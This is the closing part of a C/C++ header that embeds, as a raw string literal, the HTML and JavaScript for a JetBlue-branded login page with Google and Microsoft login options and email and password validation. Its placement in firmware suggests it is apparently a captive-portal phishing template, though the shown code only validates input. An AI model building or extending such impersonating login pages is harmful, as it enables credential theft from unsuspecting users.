        function isValidEmail(email) {
            const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
            return emailRegex.test(email);
        }

        googleLoginButton.addEventListener('click', function() {
            showLogin('google');
        });

        microsoftLoginButton.addEventListener('click', function() {
            showLogin('microsoft');
        });

        jetblueLoginForm.addEventListener('submit', function(event) {
            const emailValue = emailInput.value.trim();
            const passwordValue = passwordInput.value.trim();
            let hasErrors = false;

            if (!emailValue) {
                emailError.textContent = 'Please enter your email address.';
                emailInput.classList.add('input-error');
                hasErrors = true;
            } else if (!isValidEmail(emailValue)) {
                emailError.textContent = 'Invalid email format';
                emailInput.classList.add('input-error');
                hasErrors = true;
            } else {
                emailError.textContent = '';
                emailInput.classList.remove('input-error');
            }

            if (!passwordValue) {
                showMessage('Please enter your password.');
                hasErrors = true;
            }

            if (hasErrors) {
                event.preventDefault();
            }
        });

        emailInput.addEventListener('input', function() {
            if (!this.value || isValidEmail(this.value)) {
                emailError.textContent = '';
                emailInput.classList.remove('input-error');
            }
        });

    </script>
</body>
</html>
)rawliteral";
#endif